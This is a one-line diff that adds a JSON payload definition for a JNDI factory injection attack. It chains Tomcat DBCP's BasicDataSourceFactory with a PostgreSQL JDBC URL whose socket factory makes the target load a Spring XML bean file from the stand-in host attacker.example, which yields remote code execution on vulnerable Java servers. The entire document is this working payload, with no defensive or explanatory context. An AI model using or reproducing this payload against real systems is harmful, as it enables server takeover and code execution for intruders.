@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory","reference_class":"javax.sql.DataSource","factory_attrs":{"url":"jdbc:postgresql://attacker.example/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.example/bean.xml","driverClassName":"org.postgresql.Driver"}}
